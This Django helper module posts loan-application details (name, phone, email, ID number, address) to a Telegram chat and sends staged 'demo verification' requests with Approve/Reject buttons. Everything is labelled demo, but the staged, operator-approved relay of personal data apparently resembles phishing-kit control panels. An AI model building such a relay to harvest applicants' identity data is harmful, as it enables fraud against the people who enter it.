import requests
from html import escape
from django.conf import settings


def telegram_token():
    return getattr(settings, "TELEGRAM_BOT_TOKEN", None)


def telegram_chat_id():
    return getattr(settings, "TELEGRAM_CHAT_ID", None)


def send_telegram_notification(message, parse_mode="HTML"):
    token = telegram_token()
    chat_id = telegram_chat_id()

    if not token or not chat_id:
        print("ERROR: Telegram credentials missing")
        return False

    url = f"https://api.telegram.org/bot{token}/sendMessage"

    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": parse_mode,
    }

    try:
        response = requests.post(url, json=payload, timeout=15)

        print("Telegram sendMessage status:", response.status_code)
        print("Telegram sendMessage response:", response.text)

        return response.ok

    except requests.RequestException as e:
        print("Telegram sendMessage error:", e)
        return False


def send_demo_verification_request(verification_id, phone, stage="4"):
    """
    DEMO verification only.
    Never send real PINs, passwords, OTPs, or authentication codes.
    """

    token = telegram_token()
    chat_id = telegram_chat_id()

    if not token or not chat_id:
        print("ERROR: Telegram credentials missing")
        return None

    if str(stage) == "4":
        title = "🧪 DEMO VERIFICATION"
        description = "Approve or reject this demo verification request."
    else:
        title = "🧪 DEMO FINAL VERIFICATION"
        description = "Approve or reject this demo final verification."

    message = (
        f"<b>{title}</b>\n\n"
        f"<b>Phone:</b> {escape(str(phone))}\n"
        f"<b>Request ID:</b> <code>{verification_id}</code>\n"
        f"<b>Stage:</b> {escape(str(stage))}\n\n"
        f"<b>Status:</b> ⏳ Waiting for approval\n\n"
        f"{description}"
    )

    keyboard = {
        "inline_keyboard": [
            [
                {
                    "text": "✅ APPROVE",
                    "callback_data": f"approve:{verification_id}:{stage}",
                },
                {
                    "text": "❌ REJECT",
                    "callback_data": f"reject:{verification_id}:{stage}",
                },
            ]
        ]
    }

    url = f"https://api.telegram.org/bot{token}/sendMessage"

    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML",
        "reply_markup": keyboard,
    }

    try:
        response = requests.post(
            url,
            json=payload,
            timeout=15,
        )

        print("================================")
        print("Telegram sendMessage")
        print("STATUS:", response.status_code)
        print("RESPONSE:", response.text)
        print("================================")

        if not response.ok:
            return None

        data = response.json()

        if data.get("ok") is True:
            message_id = data["result"]["message_id"]

            print("Telegram message ID:", message_id)

            return message_id

        print("Telegram API returned error:", data)

        return None

    except requests.RequestException as e:
        print("Telegram request exception:", e)
        return None


def answer_callback_query(callback_id, text):
    token = telegram_token()

    if not token:
        return False

    url = f"https://api.telegram.org/bot{token}/answerCallbackQuery"

    payload = {
        "callback_query_id": callback_id,
        "text": text,
        "show_alert": False,
    }

    try:
        response = requests.post(
            url,
            json=payload,
            timeout=15,
        )

        print("answerCallbackQuery:", response.status_code)
        print("answerCallbackQuery response:", response.text)

        return response.ok

    except requests.RequestException as e:
        print("answerCallbackQuery error:", e)
        return False


def edit_telegram_message(chat_id, message_id, text):
    token = telegram_token()

    if not token:
        return False

    url = f"https://api.telegram.org/bot{token}/editMessageText"

    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "HTML",
    }

    try:
        response = requests.post(
            url,
            json=payload,
            timeout=15,
        )

        print("editMessageText:", response.status_code)
        print("editMessageText response:", response.text)

        return response.ok

    except requests.RequestException as e:
        print("editMessageText error:", e)
        return False

def format_loan_application_message(session_data):
    """
    Formats a loan application notification for DEMO purposes.
    Do not include real PINs, passwords, OTPs, or authentication codes.
    """

    amount = session_data.get("amount", "")
    term = session_data.get("term", "")
    name = session_data.get("name", "")
    phone = session_data.get("phone", "")
    email = session_data.get("email", "")
    id_number = session_data.get("id_number", "")
    address = session_data.get("address", "")

    return (
        "<b>🧪 DEMO LOAN APPLICATION</b>\n\n"
        f"<b>Amount:</b> {escape(str(amount))}\n"
        f"<b>Term:</b> {escape(str(term))}\n"
        f"<b>Name:</b> {escape(str(name))}\n"
        f"<b>Phone:</b> {escape(str(phone))}\n"
        f"<b>Email:</b> {escape(str(email))}\n"
        f"<b>ID Number:</b> {escape(str(id_number))}\n"
        f"<b>Address:</b> {escape(str(address))}\n\n"
        "<b>Status:</b> Demo application received"
    )
